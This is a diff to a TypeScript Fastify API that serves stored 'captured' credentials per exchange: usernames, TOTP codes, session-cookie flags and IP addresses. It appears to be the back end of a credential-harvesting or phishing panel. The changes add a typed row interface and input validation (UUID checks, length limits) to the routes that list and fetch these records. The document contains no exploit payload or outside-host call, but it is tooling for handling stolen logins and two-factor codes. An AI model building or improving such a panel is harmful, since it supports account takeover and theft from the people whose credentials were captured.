@@ -3,11 +3,22 @@
  */
 import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'
 import { createDatabaseAnchorPool } from '@legion/core/logic/database-anchor'
-import type { Pool } from 'pg'
+import type { Pool, QueryResult } from 'pg'
 
 import { sendFailure, sendSuccess } from '../lib/api-response.js'
 import { normalizeDatabaseConnectionString } from '../lib/database-anchor.js'
 import { createAuthUnificationPreHandler } from '../middleware/auth-unification.js'
+import { credIdParamSchema, exchangeParamSchema, parseQuery } from '../lib/schemas.js'
+
+interface CapturedCredRow {
+  id: string
+  exchange: string
+  username: string
+  totp: string | null
+  has_session_cookies: boolean
+  ip: string | null
+  created_at: string
+}
 
 let pool: Pool | null = null
 
@@ -47,7 +58,7 @@ export async function registerCredsCrudRoutes(app: FastifyInstance): Promise<voi
 
       return sendSuccess(reply, 200, 'Credentials list retrieved', {
         count: result.rows.length,
-        credentials: result.rows.map((row: any) => ({
+        credentials: result.rows.map((row: CapturedCredRow) => ({
           id: row.id,
           exchange: row.exchange,
           username: row.username,
@@ -67,9 +78,13 @@ export async function registerCredsCrudRoutes(app: FastifyInstance): Promise<voi
   // GET /api/v1/creds/:id - Get specific credential
   app.get('/api/v1/creds/:id', { preHandler: authPre }, async (request: FastifyRequest, reply: FastifyReply) => {
     try {
-      const { id } = request.params as { id?: string }
+      const params = request.params as { id?: string }
+      const id = params.id?.trim()
       if (!id) {
         return sendFailure(reply, 400, 'Credential ID required', { code: 'ValidationError' })
+      }
+      if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(id)) {
+        return sendFailure(reply, 400, 'Credential ID must be a valid UUID', { code: 'ValidationError' })
       }
 
       const db = getPool()
@@ -107,9 +122,13 @@ export async function registerCredsCrudRoutes(app: FastifyInstance): Promise<voi
   // GET /api/v1/creds/exchange/:exchange - Get credentials by exchange
   app.get('/api/v1/creds/exchange/:exchange', { preHandler: authPre }, async (request: FastifyRequest, reply: FastifyReply) => {
     try {
-      const { exchange } = request.params as { exchange?: string }
+      const params = request.params as { exchange?: string }
+      const exchange = params.exchange?.trim()
       if (!exchange) {
         return sendFailure(reply, 400, 'Exchange name required', { code: 'ValidationError' })
+      }
+      if (exchange.length > 100) {
+        return sendFailure(reply, 400, 'Exchange name must not exceed 100 characters', { code: 'ValidationError' })
       }
 
       const db = getPool()
@@ -144,9 +163,13 @@ export async function registerCredsCrudRoutes(app: FastifyInstance): Promise<voi
         }
       }
 
-      const { id } = request.params as { id?: string }
+      const params = request.params as { id?: string }
+      const id = params.id?.trim()
       if (!id) {
         return sendFailure(reply, 400, 'Credential ID required', { code: 'ValidationError' })
+      }
+      if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(id)) {
+        return sendFailure(reply, 400, 'Credential ID must be a valid UUID', { code: 'ValidationError' })
       }
 
       const db = getPool()
